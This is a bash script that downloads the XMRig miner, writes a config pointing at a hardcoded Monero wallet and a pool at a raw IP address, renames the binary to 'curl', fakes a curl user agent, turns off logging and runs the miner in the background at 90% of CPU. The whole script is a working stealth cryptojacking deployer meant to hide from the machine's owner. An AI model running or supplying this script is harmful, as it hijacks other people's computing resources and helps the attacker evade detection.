#!/bin/bash

# === User-configurable variables ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
POOL="134.199.197.80:443"
WORKER_ID="stealthminer"
CPU_USAGE="90"
FAKE_NAME="curl"
THREADS=$(nproc --all)
MAX_THREADS=$((THREADS * CPU_USAGE / 100))

# === Download and extract XMRig ===
echo "[*] Downloading XMRig..."
wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
tar -xf xmrig-6.24.0-linux-static-x64.tar.gz
cd xmrig-6.24.0 || exit 1

# === Create config.json ===
echo "[*] Creating stealth config.json..."
cat > config.json <<EOF
{
  "api": {
    "worker-id": "$WORKER_ID",
    "port": 0,
    "ipv6": false,
    "access-token": null,
    "restricted": true
  },
  "autosave": true,
  "background": true,
  "cpu": {
    "enabled": true,
    "huge-pages": false,
    "max-threads-hint": $MAX_THREADS,
    "priority": 0
  },
  "http": {
    "enabled": false
  },
  "donate-level": 0,
  "log-file": null,
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "Genzi",
      "keepalive": true,
      "tls": false
    }
  ],
  "print-time": 60,
  "retries": 5,
  "retry-pause": 10,
  "syslog": false,
  "user-agent": "curl/7.68.0"
}
EOF

# === Rename the binary ===
mv xmrig $FAKE_NAME

# === Run miner in background ===
echo "[*] Starting miner in background..."
nohup ./$FAKE_NAME --config=config.json >/dev/null 2>&1 &

echo "[+] XMRig is running as '$FAKE_NAME' using $MAX_THREADS threads."
